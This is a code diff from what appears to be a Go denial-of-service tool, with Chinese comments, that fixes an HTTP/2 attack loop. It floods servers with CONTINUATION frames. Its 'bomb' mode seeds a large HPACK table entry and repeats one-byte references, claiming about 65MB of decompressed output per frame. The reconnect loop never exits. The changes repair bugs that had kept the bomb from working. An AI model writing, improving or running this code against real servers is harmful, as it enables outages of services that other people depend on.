@@ -34,6 +34,10 @@ import (
 const (
 	// maxContinuationPayload 默认 SETTINGS_MAX_FRAME_SIZE(16384) - 9B 帧头
 	maxContinuationPayload = 16375
+	// firstBlockPayload 首块（与伪头字段同帧写入 HEADERS）的可用上限：
+	// 伪头（:method/:scheme/:path/:authority + 编码开销）约 60B，
+	// 留足余量后仍必须 < 帧上限，否则首帧被 FRAME_SIZE_ERROR 拒绝。
+	firstBlockPayload = maxContinuationPayload - 256
 	// bombEntrySize HPACK 动态表条目值大小：默认 HEADER_TABLE_SIZE=4096，
 	// 必须略小于表大小才不会被 evict（引用才有效）
 	bombEntrySize = 4000
@@ -41,23 +45,33 @@ const (
 
 // writeContinuationHeader 打开一个流的 header block（HEADERS 不带 END_HEADERS）。
 // firstBlock 为预编码的 hpack 块（普通填充或 bomb 大条目）。
+// 使用独立 scratch buffer 组装：rc.hpackBuf 由 build*Block 复用过，
+// 直接在其上追加会与 firstBlock 的底层数组别名冲突。
 func (c *h2ResetConn) writeContinuationHeader(scheme, authority, path string, firstBlock []byte) error {
 	c.hpackBuf.Reset()
 	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
 	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
 	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
 	c.hpackEnc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
-	if len(firstBlock) > 0 {
-		c.hpackBuf.Write(firstBlock)
+	head := c.hpackBuf.Bytes()
+	// 独立缓冲组装：伪头 + firstBlock（两者互不别名）
+	block := make([]byte, 0, len(head)+len(firstBlock))
+	block = append(block, head...)
+	block = append(block, firstBlock...)
+	if len(block) > maxContinuationPayload {
+		// 超出帧上限会被服务端 FRAME_SIZE_ERROR 直接拒绝：截断到上限内
+		// （截断只会丢失尾部填充，伪头与 seed 条目仍完整发出）
+		block = block[:maxContinuationPayload]
 	}
 	if err := c.framer.WriteHeaders(http2.HeadersFrameParam{
 		StreamID:      c.streamID,
-		BlockFragment: c.hpackBuf.Bytes(),
+		BlockFragment: block,
 		EndStream:     true,  // 请求方向结束（无 body）
 		EndHeaders:    false, // 关键：header block 未结束，必须跟 CONTINUATION
 	}); err != nil {
 		return err
 	}
+	c.streamID += 2 // 每个流一个 ID（下一次开流用新 ID，避免复用已关流）
 	return nil
 }
 
@@ -66,13 +80,26 @@ func (c *h2ResetConn) writeContinuation(block []byte) error {
 	return c.framer.WriteContinuation(c.streamID, false, block)
 }
 
-// buildPlainBlock 普通模式填充：合法小 field 重复（帧处理 + 解压压力，无放大）
-func buildPlainBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
+// copyBuf 把构建好的 hpack 块拷出为独立 slice。
+// build*Block 共用同一个 bytes.Buffer（HPACK 编码器状态必须连续），
+// 直接返回 buf.Bytes() 会让多个块的返回值共享同一底层数组——
+// 后构建的块会覆盖先构建的块（历史上导致 CONTINUATION/Bomb 完全失效：
+// 发出的 HEADERS 实际是 ref 块字节，服务端 hpack 解码 InvalidIndex）。
+func copyBuf(buf *bytes.Buffer) []byte {
+	out := make([]byte, buf.Len())
+	copy(out, buf.Bytes())
+	return out
+}
+
+// buildPlainBlock 普通模式填充：合法小 field 重复（帧处理 + 解压压力，无放大）。
+// limit 为本块允许的最大字节数（首块需给伪头留出空间，故小于帧上限）。
+func buildPlainBlock(enc *hpack.Encoder, buf *bytes.Buffer, limit int) []byte {
 	buf.Reset()
-	for buf.Len() < maxContinuationPayload {
+	// 单个 field 编码约 8B：写前判断，避免产出超过 limit
+	for buf.Len()+8 <= limit {
 		enc.WriteField(hpack.HeaderField{Name: "x-cf", Value: "y"})
 	}
-	return buf.Bytes()
+	return copyBuf(buf)
 }
 
 // buildBombSeedBlock 炸弹模式首个块：向 HPACK 动态表插入 ~4KB 大条目
@@ -80,7 +107,7 @@ func buildPlainBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
 func buildBombSeedBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
 	buf.Reset()
 	enc.WriteField(hpack.HeaderField{Name: "x-bomb", Value: strings.Repeat("A", bombEntrySize)})
-	return buf.Bytes()
+	return copyBuf(buf)
 }
 
 // buildBombRefBlock 炸弹模式填充帧：1 字节索引引用 × 16375 ≈ 65MB 解压输出/帧。
@@ -91,7 +118,7 @@ func buildBombRefBlock(enc *hpack.Encoder, buf *bytes.Buffer) []byte {
 	for buf.Len() < maxContinuationPayload {
 		buf.WriteByte(ref)
 	}
-	return buf.Bytes()
+	return copyBuf(buf)
 }
 
 // startH2ContinuationLoop 共享攻击循环。
@@ -124,6 +151,8 @@ func startH2ContinuationLoop(s *AttackSession, cfg AttackConfig, addr, scheme, a
 						// 拨号/重连：失败退避重试，绝不退出。
 						// 成功时重建 HPACK 填充块（编码器索引随连接重置，
 						// 必须先 plain → bombSeed → bombRef 保持引用顺序）。
+						// 首块受 firstBlockPayload 限制（与伪头同帧，不能超帧上限）；
+						// 填充块用满 maxContinuationPayload。
 						ensureConn := func() bool {
 							if rc != nil {
 								return true
@@ -138,13 +167,14 @@ func startH2ContinuationLoop(s *AttackSession, cfg AttackConfig, addr, scheme, a
 							rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
 							rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
 
-							plainBlock := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf)
+							plainFirst := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf, firstBlockPayload)
 							bombSeedBlock := buildBombSeedBlock(rc.hpackEnc, &rc.hpackBuf)
+							plainCont := buildPlainBlock(rc.hpackEnc, &rc.hpackBuf, maxContinuationPayload)
 							bombRefBlock := buildBombRefBlock(rc.hpackEnc, &rc.hpackBuf)
 
 							// 打开流的首个 header 块（HEADERS 帧）：bomb 模式携带大条目
-							firstBlock = plainBlock
-							contBlock = plainBlock
+							firstBlock = plainFirst
+							contBlock = plainCont
 							if bombMode {
 								firstBlock = bombSeedBlock
 								contBlock = bombRefBlock
